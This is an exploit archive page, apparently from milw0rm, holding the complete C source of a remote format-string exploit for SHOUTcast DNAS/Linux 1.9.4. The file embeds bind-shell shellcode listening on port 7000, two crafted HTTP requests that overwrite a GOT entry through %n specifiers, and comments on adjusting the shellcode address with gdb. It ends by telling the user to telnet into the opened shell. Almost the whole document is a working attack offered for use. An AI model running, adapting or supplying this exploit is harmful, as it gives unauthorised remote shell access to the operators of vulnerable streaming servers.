<html><head><title>SHOUTcast DNAS/Linux 1.9.4 Format String Remote Exploit
</title></head><pre>/* SHOUTcast DNAS/Linux v1.9.4 format string remote exploit           */
/* Damian Put &lt;pucik@cc-team.org&gt; Cyber-Crime Team (www.CC-Team.org)  */
/* Tested on slackware 9.1 and 10.0 (0xbf3feee0)                      */
/* When exploit only crash SHOUTcast we should calculate new address: */
/*                                                                    */
/* bash-2.05b$ gdb sc_serv core                                       */
/* ...                                                                */
/* (gdb) x/x $edi                                                     */
/* 0xbe462270:     0x78257825                                         */
/* (gdb) x/x 0xbe462270-996                                           */
/* 0xbe461e8c:     0x5050c031                                         */
/*                                                                    */
/* 0xbe461e8c - This is our shellcode addr                            */
/*                                                                    */
/* Now we &quot;only&quot; must change format string code in req2 :-)           */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/errno.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

/* Default SHOUTcast port */
#define PORT 8000

char shellcode[] =  //bindshellcode (port 7000)
     &quot;\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6&quot;
     &quot;\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50&quot;
     &quot;\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a&quot;
     &quot;\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31&quot;
     &quot;\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0&quot;
     &quot;\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80&quot;
     &quot;\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
     &quot;\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;

int main(int argc, char *argv[])
{
     int sock;
     char *host;
     struct hostent *h;
     struct sockaddr_in dest;

     char req1[1024] = &quot;GET /content/AA&quot;
     /* sprintf GOT addr */
     &quot;\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08&quot;;

     strcat(req1, shellcode);
     strcat(req1, &quot;.mp3 HTTP/1.0\r\n\r\n&quot;);

     /* We cannot use %numberx and %number$n (filtered) */
     /* 0xbf3feee0 -  shellcode addr on slackware 9.1   */
     char *req2 = &quot;GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x&quot;
     &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
     &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
     &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
     &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3&quot;
     &quot; HTTP/1.0\r\n\r\n&quot;;

     printf(&quot;SHOUTcast DNAS/Linux v1.9.4 format string remote exploit by pucik www.CC-Team.org\n&quot;);
     if(argc &lt; 2)
     {
           printf(&quot;Usage: %s &lt;host&gt;\n&quot;, argv[0]);
           exit(0);
     }

     host = argv[1];

     if(!(h = gethostbyname(host)))
     {
           fprintf(stderr, &quot;Cannot get IP of %s, %s!\n&quot;, host, strerror(errno));
           exit(-1);
     }

     sock = socket(PF_INET, SOCK_STREAM, 0);

     dest.sin_addr=*((struct in_addr*)h-&gt;h_addr);
     dest.sin_family = PF_INET;
     dest.sin_port = htons(PORT);

     if(connect(sock, (struct sockaddr*)&amp;dest, sizeof(struct sockaddr)) == -1)
     {
           fprintf(stderr, &quot;Cannot connect to %s, %s!\n&quot;, host, strerror(errno));
           exit(-1);
     }

     printf(&quot;[*] Sending first request ...\n&quot;);
     write(sock, req1, strlen(req1));

     close(sock);

     sock = socket(PF_INET, SOCK_STREAM, 0);

     if(connect(sock, (struct sockaddr*)&amp;dest, sizeof(struct sockaddr)) == -1)
     {
           fprintf(stderr, &quot;Cannot connect to %s, %s!\n&quot;, host, strerror(errno));
           exit(-1);
     }

     printf(&quot;[*] Sending second request ...\n&quot;);
     write(sock, req2, strlen(req2));

     close(sock);

     printf(&quot;[*] Try telnet %s 7000 :)\n&quot;, host);

     return 0;
}

// milw0rm.com [2004-12-23]</pre></html>